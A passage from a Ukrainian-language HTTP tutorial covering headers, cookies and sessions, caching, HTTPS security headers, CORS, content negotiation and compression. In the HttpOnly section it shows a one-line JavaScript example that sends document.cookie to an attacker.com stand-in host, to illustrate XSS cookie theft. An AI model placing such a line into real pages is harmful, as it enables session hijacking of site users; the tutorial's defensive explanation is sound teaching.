**Призначення:** Бажані мови.

#### Accept-Encoding

```http
Accept-Encoding: gzip, deflate, br
```

**Призначення:** Підтримувані алгоритми стиснення.

-   `gzip` — GZIP compression
-   `deflate` — DEFLATE compression
-   `br` — Brotli compression

#### Authorization

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

```http
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
```

**Призначення:** Credentials для аутентифікації.

**Типи:**

-   `Basic` — Base64(username:password)
-   `Bearer` — OAuth/JWT токен
-   `Digest` — Digest authentication

#### Cookie

```http
Cookie: sessionId=abc123; userId=456; theme=dark
```

**Призначення:** Cookies від сервера.

#### Referer

```http
Referer: https://www.google.com/search?q=http+protocol
```

**Призначення:** URL попередньої сторінки.

#### Origin

```http
Origin: https://www.example.com
```

**Призначення:** Джерело запиту (для CORS).

#### If-None-Match

```http
If-None-Match: "abc123def456"
```

**Призначення:** Використовується з ETag для умовних запитів.

#### If-Modified-Since

```http
If-Modified-Since: Mon, 20 Dec 2024 10:00:00 GMT
```

**Призначення:** Повернути тільки якщо змінено після цієї дати.

---

### Response Headers (Заголовки відповіді)

#### Server

```http
Server: nginx/1.20.1
```

```http
Server: Apache/2.4.41 (Ubuntu)
```

**Призначення:** Інформація про серверне ПЗ.

#### Set-Cookie

```http
Set-Cookie: sessionId=xyz789; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
```

**Призначення:** Встановлення cookie в браузері.

**Атрибути:**

-   `Path=/` — доступний на всіх шляхах
-   `Domain=.example.com` — доступний на всіх субдоменах
-   `HttpOnly` — недоступний через JavaScript (безпека!)
-   `Secure` — тільки через HTTPS
-   `SameSite=Strict` — захист від CSRF
    -   `Strict` — тільки same-site запити
    -   `Lax` — дозволено GET навігацію
    -   `None` — всі запити (потрібен Secure)
-   `Max-Age=3600` — час життя в секундах
-   `Expires=Wed, 21 Oct 2025 07:28:00 GMT` — абсолютна дата закінчення

**Приклад множинних cookies:**

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure
Set-Cookie: theme=dark; Path=/; Max-Age=31536000
Set-Cookie: language=uk; Path=/; Max-Age=31536000
```

#### Location

```http
Location: https://www.example.com/new-page
```

```http
Location: /api/users/123
```

**Призначення:** URL для перенаправлення або створеного ресурсу.

#### ETag

```http
ETag: "abc123def456"
```

```http
ETag: W/"abc123"
```

**Призначення:** Унікальний ідентифікатор версії ресурсу (для кешування).

-   `W/` prefix — "Weak" ETag (менш точний)

#### Last-Modified

```http
Last-Modified: Mon, 20 Dec 2024 10:30:00 GMT
```

**Призначення:** Дата останньої модифікації ресурсу.

#### Access-Control-Allow-Origin

```http
Access-Control-Allow-Origin: *
```

```http
Access-Control-Allow-Origin: https://trusted-site.com
```

**Призначення:** CORS — дозволені джерела для cross-origin запитів.

#### Access-Control-Allow-Methods

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

**Призначення:** Дозволені HTTP методи для CORS.

#### Access-Control-Allow-Headers

```http
Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header
```

**Призначення:** Дозволені заголовки для CORS.

#### Strict-Transport-Security (HSTS)

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Призначення:** Примусити використання HTTPS.

-   `max-age=31536000` — 1 рік
-   `includeSubDomains` — включити всі субдомени
-   `preload` — включити в preload list браузерів

---

### Entity Headers (Заголовки сутності)

Інформація про тіло повідомлення.

#### Content-Type

```http
Content-Type: application/json; charset=utf-8
```

```http
Content-Type: text/html; charset=utf-8
```

```http
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
```

**Основні MIME типи:**

```
application/json          → JSON дані
application/xml           → XML дані
text/html                 → HTML сторінка
text/plain                → Простий текст
text/css                  → CSS стилі
text/javascript           → JavaScript код
application/javascript    → JavaScript (альтернатива)
image/jpeg                → JPEG зображення
image/png                 → PNG зображення
image/gif                 → GIF анімація
image/svg+xml             → SVG векторна графіка
video/mp4                 → MP4 відео
audio/mpeg                → MP3 аудіо
application/pdf           → PDF документ
application/zip           → ZIP архів
application/octet-stream  → Бінарні дані (загальний)
multipart/form-data       → Форма з файлами
application/x-www-form-urlencoded → Форма без файлів
```

#### Content-Length

```http
Content-Length: 1234
```

**Призначення:** Розмір тіла в байтах.

#### Content-Encoding

```http
Content-Encoding: gzip
```

```http
Content-Encoding: br
```

**Призначення:** Алгоритм стиснення, застосований до тіла.

#### Content-Language

```http
Content-Language: uk-UA
```

```http
Content-Language: en-US, es-ES
```

**Призначення:** Мова контенту.

#### Content-Location

```http
Content-Location: /documents/report.pdf
```

**Призначення:** Альтернативне розташування ресурсу.

#### Content-Range

```http
Content-Range: bytes 0-1023/2048
```

**Призначення:** Діапазон байтів для часткового контенту (206 статус).

---

### Custom Headers (Власні заголовки)

Можна створювати власні заголовки. Рекомендується префікс `X-` (хоча це deprecated, але все ще використовується).

**Приклади:**

```http
X-Request-ID: req_123456789
X-API-Version: v2
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 999
X-RateLimit-Reset: 1703332800
X-Powered-By: Express
X-Response-Time: 123ms
X-Custom-Header: custom-value
```

---

### Приклад повного набору заголовків:

**Запит:**

```http
POST /api/users HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json, text/plain, */*
Accept-Language: uk-UA,uk;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
Content-Type: application/json; charset=utf-8
Content-Length: 87
Origin: https://example.com
Referer: https://example.com/signup
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Cookie: sessionId=abc123; theme=dark
Connection: keep-alive
Cache-Control: no-cache
X-Request-ID: req_987654321

{
  "name": "Олена",
  "email": "olena@example.com",
  "age": 25
}
```

**Відповідь:**

```http
HTTP/1.1 201 Created
Date: Mon, 23 Dec 2024 14:30:00 GMT
Server: nginx/1.20.1
Content-Type: application/json; charset=utf-8
Content-Length: 156
Content-Encoding: gzip
Location: /api/users/789
ETag: "xyz789abc"
Last-Modified: Mon, 23 Dec 2024 14:30:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Set-Cookie: userId=789; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=86400
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Request-ID: req_987654321
X-Response-Time: 45ms
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 998
Connection: keep-alive

{
  "id": 789,
  "name": "Олена",
  "email": "olena@example.com",
  "age": 25,
  "createdAt": "2024-12-23T14:30:00Z"
}
```

---

## Cookies та управління сесіями

### Що таке Cookies?

**Cookie** — це невеликий фрагмент даних, який сервер відправляє браузеру, а браузер зберігає і відправляє назад при наступних запитах.

**Призначення:**

-   Управління сесіями (логін)
-   Персоналізація (налаштування, тема)
-   Відстеження (аналітика, реклама)

### Як працюють Cookies?

```
1. Клієнт → Сервер: Запит без cookie
   GET / HTTP/1.1
   Host: example.com

2. Сервер → Клієнт: Встановлює cookie
   HTTP/1.1 200 OK
   Set-Cookie: sessionId=abc123; Path=/; HttpOnly

3. Клієнт → Сервер: Наступні запити з cookie
   GET /profile HTTP/1.1
   Host: example.com
   Cookie: sessionId=abc123

4. Сервер розпізнає клієнта!
```

### Встановлення Cookie:

```http
Set-Cookie: name=value; атрибути
```

**Приклади:**

```http
Set-Cookie: sessionId=xyz789
Set-Cookie: userId=123; Max-Age=86400
Set-Cookie: theme=dark; Path=/; Expires=Wed, 21 Dec 2025 07:28:00 GMT
Set-Cookie: token=abc; Domain=.example.com; Secure; HttpOnly; SameSite=Strict
```

### Атрибути Cookie:

#### Path

```http
Set-Cookie: data=value; Path=/admin
```

Cookie доступний тільки для `/admin` та його підшляхів.

#### Domain

```http
Set-Cookie: data=value; Domain=.example.com
```

Cookie доступний для `example.com` та всіх субдоменів (`www.example.com`, `api.example.com`).

#### Expires

```http
Set-Cookie: data=value; Expires=Wed, 21 Dec 2025 07:28:00 GMT
```

Абсолютна дата закінчення.

#### Max-Age

```http
Set-Cookie: data=value; Max-Age=3600
```

Час життя в секундах (перевага над Expires).

**Приклади:**

```
Max-Age=60       → 1 хвилина
Max-Age=3600     → 1 година
Max-Age=86400    → 1 день
Max-Age=604800   → 1 тиждень
Max-Age=2592000  → 30 днів
Max-Age=31536000 → 1 рік
```

#### Secure

```http
Set-Cookie: data=value; Secure
```

Cookie відправляється ТІЛЬКИ через HTTPS.

#### HttpOnly

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

Cookie недоступний через JavaScript (`document.cookie`). Захист від XSS атак!

**Без HttpOnly:**

```javascript
// Зловмисний скрипт може вкрасти cookie:
fetch('https://attacker.com/steal?cookie=' + document.cookie)
```

**З HttpOnly:** JavaScript не може прочитати cookie. ✅

#### SameSite

```http
Set-Cookie: data=value; SameSite=Strict
```

**Значення:**

-   `Strict` — cookie відправляється ТІЛЬКИ для same-site запитів
-   `Lax` — cookie відправляється для top-level navigation (клік по посиланню)
-   `None` — cookie відправляється для всіх запитів (потрібен атрибут Secure)

**Приклади:**

**SameSite=Strict:**

```
example.com встановлює: Set-Cookie: data=value; SameSite=Strict

✅ Користувач на example.com → запит до example.com (cookie відправлений)
❌ Користувач на google.com → клік на example.com (cookie НЕ відправлений)
❌ Форма на attacker.com → POST до example.com (cookie НЕ відправлений)
```

**SameSite=Lax (за замовчуванням):**

```
✅ Користувач на example.com → запит до example.com
✅ Користувач на google.com → клік (GET) на example.com
❌ Форма на attacker.com → POST до example.com
```

**SameSite=None:**

```
Set-Cookie: data=value; SameSite=None; Secure

✅ Всі запити (потрібен для iframe, API, тощо)
```

### Видалення Cookie:

Встановити `Max-Age=0` або `Expires` в минулому:

```http
Set-Cookie: sessionId=; Max-Age=0
```

```http
Set-Cookie: sessionId=; Expires=Thu, 01 Jan 1970 00:00:00 GMT
```

### Приклад Session Management:

**1. Логін:**

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{"username": "user", "password": "pass"}
```

**Відповідь:**

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123xyz; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600

{"message": "Login successful"}
```

**2. Наступний запит:**

```http
GET /api/profile HTTP/1.1
Host: example.com
Cookie: sessionId=abc123xyz
```

**Відповідь:**

```http
HTTP/1.1 200 OK

{"name": "Іван", "email": "ivan@example.com"}
```

**3. Логаут:**

```http
POST /logout HTTP/1.1
Host: example.com
Cookie: sessionId=abc123xyz
```

**Відповідь:**

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=; Max-Age=0

{"message": "Logged out"}
```

### First-Party vs Third-Party Cookies:

**First-Party Cookie:**

```
Ви на example.com
example.com встановлює cookie для example.com
→ First-party cookie
```

**Third-Party Cookie:**

```
Ви на example.com
example.com завантажує <img src="tracker.com/pixel.gif">
tracker.com встановлює cookie для tracker.com
→ Third-party cookie (часто для tracking)
```

**Сучасні браузери блокують third-party cookies за замовчуванням.**

---

## Кешування в HTTP

**Кешування** — це зберігання копій ресурсів для швидшого доступу.

### Переваги кешування:

-   ⚡ Швидше завантаження
-   💰 Менше навантаження на сервер
-   📉 Менше трафіку

### Типи кешів:

```
Browser Cache  → Локальний кеш браузера
Proxy Cache    → Проміжний кеш (CDN, ISP)
Gateway Cache  → Кеш на рівні сервера (Varnish, Nginx)
```

### Cache-Control заголовок:

#### Директиви:

**no-cache:**

```http
Cache-Control: no-cache
```

Кеш можна використовувати, але спочатку перевірити з сервером (revalidation).

**no-store:**

```http
Cache-Control: no-store
```

НЕ кешувати взагалі! (для чутливих даних)

**public:**

```http
Cache-Control: public, max-age=3600
```

Можна кешувати всюди (browser, proxy, CDN).

**private:**

```http
Cache-Control: private, max-age=3600
```

Тільки browser може кешувати (не proxy/CDN). Для персональних даних.

**max-age:**

```http
Cache-Control: max-age=86400
```

Кеш валідний 86400 секунд (24 години).

**s-maxage:**

```http
Cache-Control: public, max-age=3600, s-maxage=86400
```

`s-maxage` — для shared caches (CDN, proxy). Перевизначає `max-age` для них.

**must-revalidate:**

```http
Cache-Control: max-age=3600, must-revalidate
```

Після закінчення `max-age` ОБОВ'ЯЗКОВО перевірити з сервером.

**immutable:**

```http
Cache-Control: public, max-age=31536000, immutable
```

Ресурс НІКОЛИ не зміниться (для файлів з hash в імені).

### Приклади стратегій кешування:

**1. Статичні ресурси (CSS, JS з hash):**

```http
Cache-Control: public, max-age=31536000, immutable
```

Кешувати на рік, ніколи не перевіряти (файли з версією: `app.abc123.js`).

**2. HTML сторінки:**

```http
Cache-Control: no-cache, must-revalidate
```

або

```http
Cache-Control: public, max-age=60
```

Завжди перевіряти або короткий час життя.

**3. API відповіді:**

```http
Cache-Control: private, max-age=0, no-cache
```

або

```http
Cache-Control: no-store
```

Не кешувати взагалі.

**4. Зображення, шрифти:**

```http
Cache-Control: public, max-age=604800
```

Кешувати на тиждень.

**5. CDN ресурси:**

```http
Cache-Control: public, max-age=3600, s-maxage=86400
```

Браузер — 1 година, CDN — 1 день.

### ETag і Last-Modified:

#### ETag (Entity Tag):

```http
HTTP/1.1 200 OK
ETag: "abc123def456"
Content-Type: text/css

.button { color: blue; }
```

**Наступний запит (conditional):**

```http
GET /style.css HTTP/1.1
If-None-Match: "abc123def456"
```

**Відповідь (якщо не змінилось):**

```http
HTTP/1.1 304 Not Modified
ETag: "abc123def456"
```

→ Браузер використовує кеш. Економія трафіку!

**Відповідь (якщо змінилось):**

```http
HTTP/1.1 200 OK
ETag: "xyz789new"
Content-Type: text/css

.button { color: red; }
```

#### Last-Modified:

```http
HTTP/1.1 200 OK
Last-Modified: Mon, 20 Dec 2024 10:00:00 GMT
Content-Type: image/jpeg

[image data]
```

**Наступний запит:**

```http
GET /image.jpg HTTP/1.1
If-Modified-Since: Mon, 20 Dec 2024 10:00:00 GMT
```

**Відповідь (якщо не змінилось):**

```http
HTTP/1.1 304 Not Modified
```

### Expires (застарілий):

```http
Expires: Wed, 21 Dec 2025 07:28:00 GMT
```

Використовуйте `Cache-Control: max-age` замість цього!

### Vary:

```http
Vary: Accept-Encoding, Accept-Language
```

Кеш має враховувати ці заголовки (різні версії ресурсу).

**Приклад:**

```
Запит 1: Accept-Encoding: gzip    → кеш версію A (gzip)
Запит 2: Accept-Encoding: br      → кеш версію B (brotli)
Запит 3: Accept-Encoding: gzip    → використати версію A з кешу
```

### Приклад повного кешування:

**Запит 1 (cache miss):**

```http
GET /style.css HTTP/1.1
Host: example.com
```

**Відповідь:**

```http
HTTP/1.1 200 OK
Cache-Control: public, max-age=3600
ETag: "abc123"
Last-Modified: Mon, 20 Dec 2024 10:00:00 GMT
Content-Type: text/css

.button { color: blue; }
```

**Запит 2 (протягом 1 години — cache hit):**

```
Браузер використовує локальний кеш, запит НЕ відправляється!
```

**Запит 3 (після 1 години — revalidation):**

```http
GET /style.css HTTP/1.1
Host: example.com
If-None-Match: "abc123"
If-Modified-Since: Mon, 20 Dec 2024 10:00:00 GMT
```

**Відповідь (не змінилось):**

```http
HTTP/1.1 304 Not Modified
Cache-Control: public, max-age=3600
ETag: "abc123"
```

→ Кеш оновлено на ще 1 годину.

---

## HTTPS та безпека

### Що таке HTTPS?

**HTTPS** = HTTP + TLS/SSL

**TLS** (Transport Layer Security) — криптографічний протокол для безпечної передачі даних.

### Навіщо HTTPS?

1. **Шифрування** — дані недоступні для перехоплення
2. **Автентифікація** — впевненість, що спілкуємось з правильним сервером
3. **Цілісність** — дані не змінені під час передачі

### Як працює HTTPS?

#### 1. TCP Handshake

```
Client: SYN →
        ← Server: SYN-ACK
Client: ACK →
```

#### 2. TLS Handshake

```
1. Client Hello
   → Підтримувані cipher suites, версія TLS

2. Server Hello
   ← Обраний cipher suite, сертифікат сервера

3. Key Exchange
   → Client генерує pre-master secret, шифрує публічним ключем сервера

4. Finished
   ↔ Обидві сторони мають session key, шифрування активовано ✓
```

#### 3. Зашифрований HTTP

```http
GET /api/data HTTP/1.1
Host: secure.example.com
Authorization: Bearer secret_token

→ Все зашифровано! Неможливо прочитати по дорозі.
```

### SSL/TLS Certificates:

**Сертифікат** — це цифровий документ, який підтверджує ідентичність сайту.

**Містить:**

-   Доменне ім'я
-   Публічний ключ
-   Інформацію про власника
-   Підпис Certificate Authority (CA)

**Типи сертифікатів:**

1. **Domain Validation (DV)** — базова перевірка домену (Let's Encrypt)
2. **Organization Validation (OV)** — перевірка організації
3. **Extended Validation (EV)** — повна перевірка (зелений індикатор в старих браузерах)

### Приклад перевірки сертифіката:

```bash
# Дивитись сертифікат
curl -vI https://example.com 2>&1 | grep -A 5 "SSL certificate"

# Деталі з OpenSSL
openssl s_client -connect example.com:443 -servername example.com
```

### HTTPS заголовки безпеки:

#### Strict-Transport-Security (HSTS)

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Примусити браузер ЗАВЖДИ використовувати HTTPS.

**Ефект:**

```
Користувач вводить: http://example.com
Браузер автоматично змінює на: https://example.com
```

#### Content-Security-Policy (CSP)

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; img-src *
```

Контроль звідки можна завантажувати ресурси (захист від XSS).

**Приклад:**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src * data:;
  font-src 'self' https://fonts.googleapis.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```

#### X-Content-Type-Options

```http
X-Content-Type-Options: nosniff
```

Заборонити браузеру "вгадувати" MIME type (захист від MIME sniffing атак).

#### X-Frame-Options

```http
X-Frame-Options: DENY
```

або

```http
X-Frame-Options: SAMEORIGIN
```

Захист від Clickjacking (заборонити iframe).

#### X-XSS-Protection (застарілий, але все ще використовується)

```http
X-XSS-Protection: 1; mode=block
```

Вбудований XSS фільтр браузера.

#### Referrer-Policy

```http
Referrer-Policy: strict-origin-when-cross-origin
```

Контроль, скільки інформації передавати в `Referer` заголовку.

**Значення:**

-   `no-referrer` — не відправляти взагалі
-   `origin` — тільки origin (без шляху)
-   `strict-origin-when-cross-origin` — повний URL для same-origin, тільки origin для cross-origin

#### Permissions-Policy

```http
Permissions-Policy: geolocation=(), camera=(), microphone=()
```

Контроль доступу до API браузера.

### Приклад безпечного HTTPS відповіді:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()

<!DOCTYPE html>
<html>
...
</html>
```

---

## CORS (Cross-Origin Resource Sharing)

### Що таке CORS?

**CORS** — механізм, який дозволяє веб-додаткам на одному origin отримувати ресурси з іншого origin.

**Origin** = протокол + домен + порт

```
https://example.com:443  ← origin
│       │          │
│       │          └── порт
│       └───────────── домен
└──────────────────── протокол
```

### Same-Origin Policy:

**За замовчуванням, браузери блокують cross-origin запити!**

**Same-origin (дозволено):**

```
Сторінка: https://example.com/page.html
Запит до: https://example.com/api/data  ✅
```

**Cross-origin (заблоковано без CORS):**

```
Сторінка: https://example.com
Запит до: https://api.another.com/data  ❌
```

**Приклади same-origin vs cross-origin:**

```
https://example.com/page1.html → https://example.com/page2.html  ✅ Same-origin
https://example.com → http://example.com                         ❌ Інший протокол
https://example.com → https://www.example.com                    ❌ Інший субдомен
https://example.com → https://example.com:8080                   ❌ Інший порт
```

### Як працює CORS?

#### Simple Requests (прості запити):

**Умови для "simple request":**

-   Метод: GET, HEAD, або POST
-   Тільки безпечні заголовки (Accept, Accept-Language, Content-Language, Content-Type)
-   Content-Type: application/x-www-form-urlencoded, multipart/form-data, або text/plain

**Приклад:**

```http
GET /api/data HTTP/1.1
Host: api.example.com
Origin: https://my-app.com
```

**Відповідь (дозволено):**

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://my-app.com
Content-Type: application/json

{"data": "..."}
```

**Відповідь (заблоковано):**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"data": "..."}
```

→ Браузер заблокує відповідь, бо немає `Access-Control-Allow-Origin`!

#### Preflight Requests (попередні запити):

**Коли потрібен preflight:**

-   Метод: PUT, DELETE, PATCH, тощо
-   Custom headers (Authorization, X-Custom-Header)
-   Content-Type: application/json

**Приклад:**

**1. Браузер автоматично відправляє OPTIONS (preflight):**

```http
OPTIONS /api/users HTTP/1.1
Host: api.example.com
Origin: https://my-app.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

**2. Сервер відповідає дозволами:**

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://my-app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

**3. Браузер відправляє справжній запит:**

```http
POST /api/users HTTP/1.1
Host: api.example.com
Origin: https://my-app.com
Content-Type: application/json
Authorization: Bearer token123

{"name": "Іван"}
```

**4. Відповідь:**

```http
HTTP/1.1 201 Created
Access-Control-Allow-Origin: https://my-app.com
Content-Type: application/json

{"id": 1, "name": "Іван"}
```

### CORS заголовки:

#### Access-Control-Allow-Origin

```http
Access-Control-Allow-Origin: https://trusted-site.com
```

або

```http
Access-Control-Allow-Origin: *
```

**Увага:** `*` не працює з credentials (cookies)!

**Для credentials:**

```http
Access-Control-Allow-Origin: https://trusted-site.com
Access-Control-Allow-Credentials: true
```

#### Access-Control-Allow-Methods

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

#### Access-Control-Allow-Headers

```http
Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header
```

#### Access-Control-Max-Age

```http
Access-Control-Max-Age: 86400
```

Кешувати preflight відповідь на 24 години (браузер не буде повторювати preflight).

#### Access-Control-Expose-Headers

```http
Access-Control-Expose-Headers: X-Request-ID, X-RateLimit-Remaining
```

Дозволити JavaScript читати ці заголовки з відповіді.

**Без цього:**

```javascript
fetch('https://api.example.com/data').then((res) => {
    console.log(res.headers.get('Content-Type')) // ✅ Доступно
    console.log(res.headers.get('X-Request-ID')) // ❌ null (заблоковано)
})
```

**З `Access-Control-Expose-Headers`:**

```javascript
fetch('https://api.example.com/data').then((res) => {
    console.log(res.headers.get('X-Request-ID')) // ✅ Доступно!
})
```

#### Access-Control-Allow-Credentials

```http
Access-Control-Allow-Credentials: true
```

Дозволити відправку cookies та Authorization headers в cross-origin запитах.

**JavaScript:**

```javascript
fetch('https://api.example.com/data', {
    credentials: 'include', // Відправити cookies
})
```

### Приклад повного CORS flow:

**Сторінка:** `https://my-app.com`

**JavaScript:**

```javascript
fetch('https://api.example.com/users', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        Authorization: 'Bearer token123',
    },
    body: JSON.stringify({ name: 'Марія' }),
    credentials: 'include',
})
```

**Preflight (автоматично):**

```http
OPTIONS /users HTTP/1.1
Host: api.example.com
Origin: https://my-app.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type, Authorization
```

**Preflight Response:**

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://my-app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

**Actual Request:**

```http
POST /users HTTP/1.1
Host: api.example.com
Origin: https://my-app.com
Content-Type: application/json
Authorization: Bearer token123
Cookie: sessionId=abc123

{"name": "Марія"}
```

**Response:**

```http
HTTP/1.1 201 Created
Access-Control-Allow-Origin: https://my-app.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: X-Request-ID
Content-Type: application/json
X-Request-ID: req_12345

{"id": 2, "name": "Марія"}
```

---

## Content Negotiation

**Content Negotiation** — механізм вибору найкращого представлення ресурсу на основі можливостей клієнта.

### Типи:

1. **Server-driven** — сервер вибирає на основі заголовків
2. **Agent-driven** — клієнт вибирає з списку варіантів
3. **Transparent** — проксі вибирає

### Server-driven Content Negotiation:

#### Accept (тип контенту)

```http
Accept: application/json, application/xml;q=0.9, text/plain;q=0.8, */*;q=0.5
```

**Сервер відповідає:**

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"data": "JSON format"}
```

**Приклад з різними форматами:**

```http
# Клієнт просить JSON
GET /users/1 HTTP/1.1
Accept: application/json

→ {"id": 1, "name": "Іван"}

# Клієнт просить XML
GET /users/1 HTTP/1.1
Accept: application/xml

→ <user><id>1</id><name>Іван</name></user>

# Клієнт просить HTML
GET /users/1 HTTP/1.1
Accept: text/html

→ <html><body><h1>Іван</h1></body></html>
```

#### Accept-Language (мова)

```http
Accept-Language: uk-UA, uk;q=0.9, en;q=0.8, ru;q=0.7
```

**Відповідь:**

```http
HTTP/1.1 200 OK
Content-Language: uk-UA

{"message": "Привіт!"}
```

**Приклад:**

```http
GET /greeting HTTP/1.1
Accept-Language: uk

→ {"message": "Привіт!"}

GET /greeting HTTP/1.1
Accept-Language: en

→ {"message": "Hello!"}
```

#### Accept-Encoding (compression)

```http
Accept-Encoding: gzip, deflate, br
```

**Відповідь:**

```http
HTTP/1.1 200 OK
Content-Encoding: br

[brotli compressed data]
```

#### Accept-Charset (застарілий)

```http
Accept-Charset: utf-8, iso-8859-1;q=0.5
```

### Quality Values (q):

**Формат:**

```
type;q=value
```

**q** від 0.0 до 1.0 (за замовчуванням 1.0)

**Приклад:**

```http
Accept: text/html;q=1.0, application/json;q=0.8, text/plain;q=0.5, */*;q=0.1
```

**Пріоритет:**

1. text/html (q=1.0) — найвищий
2. application/json (q=0.8)
3. text/plain (q=0.5)
4. інші (q=0.1) — найнижчий

### Vary Header:

Сервер вказує, які заголовки впливали на вибір:

```http
Vary: Accept, Accept-Language, Accept-Encoding
```

Важливо для кешування!

### Приклад Content Negotiation:

**Запит 1:**

```http
GET /api/data HTTP/1.1
Accept: application/json
Accept-Language: uk
Accept-Encoding: gzip
```

**Відповідь:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Language: uk
Content-Encoding: gzip
Vary: Accept, Accept-Language, Accept-Encoding

[gzipped JSON data]
```

**Запит 2:**

```http
GET /api/data HTTP/1.1
Accept: text/csv
Accept-Language: en
```

**Відповідь:**

```http
HTTP/1.1 200 OK
Content-Type: text/csv; charset=utf-8
Content-Language: en
Vary: Accept, Accept-Language

id,name
1,"John"
2,"Jane"
```

### 406 Not Acceptable:

Якщо сервер не може надати прийнятний формат:

```http
HTTP/1.1 406 Not Acceptable
Content-Type: application/json

{
  "error": "Not Acceptable",
  "message": "Сервер не може надати ресурс у форматі image/gif",
  "availableFormats": ["application/json", "application/xml", "text/html"]
}
```

---

## Compression (Стиснення даних)

**Compression** зменшує розмір даних для швидшої передачі.

### Алгоритми стиснення:

1. **GZIP** — найпоширеніший, гарне співвідношення швидкість/стиснення
2. **Deflate** — схожий на GZIP
3. **Brotli (br)** — кращий для тексту, підтримка в сучасних браузерах

### Як працює:

**1. Клієнт вказує підтримувані алгоритми:**

```http
GET /style.css HTTP/1.1
Accept-Encoding: gzip, deflate, br
```

**2. Сервер стискає та відправляє:**

```http
HTTP/1.1 200 OK
Content-Type: text/css
Content-Encoding: br
Content-Length: 1234
Vary: Accept-Encoding

[brotli compressed data]
```

**3. Браузер автоматично розпаковує.**

### Порівняння алгоритмів:

**Оригінальний розмір:** 100 KB

| Алгоритм | Розмір після | Швидкість | Підтримка |
| -------- | ------------ | --------- | --------- |
| None     | 100 KB       | N/A       | 100%      |
| GZIP     | ~25 KB       | Швидко    | 99%+      |
| Deflate  | ~26 KB       | Швидко    | 95%+      |
| Brotli   | ~20 KB       | Середньо  | 95%+      |

### Що стискати?

**✅ Стискати:**

-   HTML
-   CSS
-   JavaScript
-   JSON
-   XML
-   SVG
-   Текстові файли

**❌ НЕ стискати:**

-   Зображення (JPEG, PNG вже стиснені)
-   Відео (MP4, WebM вже стиснені)
-   Аудіо (MP3 вже стиснений)
-   ZIP, GZIP архіви (вже стиснені)

### Приклад:

**Без compression:**

```http
GET /app.js HTTP/1.1
Host: example.com

HTTP/1.1 200 OK
Content-Type: text/javascript
Content-Length: 524288

[524 KB JavaScript code]
```

**З compression:**

```http
GET /app.js HTTP/1.1
Host: example.com
Accept-Encoding: br, gzip

HTTP/1.1 200 OK
Content-Type: text/javascript
Content-Encoding: br
Content-Length: 102400
Vary: Accept-Encoding

[102 KB compressed data]
```

**Економія:** 524 KB → 102 KB (~80% менше!)

### Налаштування на сервері:

**Nginx:**

```nginx
gzip on;
gzip_types text/plain text/css application/json application/javascript text/xml application/xml;
gzip_min_length 1000;
gzip_comp_level 6;

brotli on;
brotli_types text/plain text/css application/json application/javascript;
```

**Apache:**

```apache
<IfModule mod_deflate.c>
  AddOutputFilterByType DEFLATE text/html text/plain text/css application/json application/javascript
</IfModule>
```

### Identity encoding:

```http
Accept-Encoding: identity
```

Означає "без compression".

---

## HTTP/2: нове покоління

### Що нового в HTTP/2?

**HTTP/1.1 проблеми:**

-   Head-of-line blocking
-   Неефективність (багато з'єднань)
-   Overhead заголовків (повторення)

**HTTP/2 рішення:**

-   Бінарний протокол
-   Multiplexing
-   Server Push
-   Header Compression (HPACK)
-   Stream Prioritization

### Бінарний протокол:

**HTTP/1.1 (текстовий):**

```http
GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

**HTTP/2 (бінарний):**

```
00 00 0c 01 05 00 00 00 01 ...
[frames в бінарному форматі]
```

